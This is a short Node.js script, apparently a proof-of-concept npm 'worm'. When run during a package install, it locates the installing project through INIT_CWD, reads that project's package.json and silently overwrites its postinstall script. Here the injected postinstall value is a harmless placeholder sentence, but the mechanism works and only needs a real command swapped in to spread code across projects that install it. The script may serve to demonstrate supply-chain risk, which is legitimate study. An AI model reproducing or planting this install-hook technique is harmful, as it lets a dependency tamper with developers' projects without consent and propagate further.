"use strict";

var path = require('path');
var fs = require('fs');

console.log('Beginning of worm infection');
try{
    var projectPath = process.env.INIT_CWD;
    var packageJsonPath = path.join(projectPath, 'package.json');
    
    console.log(projectPath);
    console.log(packageJsonPath);

    var packageJsonContent = JSON.parse(
        fs.readFileSync( packageJsonPath ).toString()
    );

    packageJsonContent.scripts = packageJsonContent.scripts || {};
    packageJsonContent.scripts.postinstall = "this sentence is the result of the worm infection";

    fs.writeFileSync( packageJsonPath, JSON.stringify(packageJsonContent, null, 3) )
    console.log('Worm infection complete, congratulations!');
}
catch(e){
    console.error('Woops, the worm failed to infect your machine', e);
}
